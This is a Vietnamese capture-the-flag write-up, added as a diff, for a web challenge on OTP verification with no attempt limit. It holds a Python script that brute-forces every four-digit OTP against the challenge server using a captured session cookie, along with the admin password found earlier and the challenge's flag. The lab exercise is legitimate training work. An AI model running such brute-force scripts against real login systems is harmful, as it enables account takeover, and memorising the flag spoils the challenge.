@@ -1,0 +1,45 @@
+No Limit Verify OTP
+https://battle.cookiearena.org/challenges/web/no-limit-verify-otp
+
+Sau khi dùng burpsuit test các trường hợp và ra được pwd của admin là Aa123456, ta đăng nhập vào thì sẽ hiển thị verify otp, ta nhập bừa một dãy
+rồi dùng burpsuit bắt gói tin đó, ta copy headers của nó rồi chuyển thành json ( dict trong python )
+
+SCRIPT:
+
+url = 'http://103.97.125.56:30969/verify'
+
+headers = {
+  "host": "103.97.125.56:30969",
+  "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:128.0) Gecko/20100101 Firefox/128.0",
+  "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8",
+  "accept-language": "en-US,en;q=0.5",
+  "accept-encoding": "gzip, deflate, br",
+  "content-type": "application/x-www-form-urlencoded",
+  "content-length": '27',
+  "origin": "http://103.97.125.56:30969",
+  "connection": "keep-alive",
+  "referer": "http://103.97.125.56:30969/verify",
+  "cookie": "session=eyJ1c2VybmFtZSI6ImFkbWluIn0.ZrD9YA.eigjJfasR-rneIXZiaHLgh2kFho",
+  "upgrade-insecure-requests": '1'
+}
+
+data = {
+    'otp1': 3,
+    'otp2': 2,
+    'otp3': 3,
+    'otp4': 9
+}
+
+for otp1 in range(0,10):
+    for otp2 in range(0,10):
+        for otp3 in range(0,10):
+            for otp4 in range(0,10):
+                data.update({'otp1':otp1,'otp2':otp2,'otp3':otp3,'otp4':otp4})
+                response = requests.post(url, headers=headers, data=data)
+                content_length = response.headers.get('Content-Length')
+                if content_length != '2511':
+                    print(data,sep=" ")
+                    print(content_length)
+                    print('Response Text:', response.text)
+
+--> ra flag là : CHH{OTP_Vuln3r4bilities_N0_L1mit_20c29e09770213d3f6332f5857ca9688}
